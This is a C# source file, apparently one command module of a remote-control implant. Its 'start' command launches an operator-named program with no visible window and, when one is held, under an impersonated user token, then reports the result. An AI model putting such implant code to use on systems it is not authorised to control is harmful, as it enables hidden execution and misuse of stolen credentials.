
using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class StartCommand : AgentCommand
    {
        public override string Name => "start";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            var filename = task.SplittedArgs[0];
            string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();

            var winAPI = WinAPIWrapper.CreateInstance();

            var creationParms = new ProcessCreationParameters()
            {
                Application = filename + " " + args,
                RedirectOutput = false,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
                creationParms.Token = ImpersonationHelper.ImpersonatedToken;

            var procResult = winAPI.CreateProcess(creationParms);
            if(procResult.ProcessId == 0)
                context.Error("Process start failed!");
            else
                context.AppendResult("Process started");
        }
    }
}
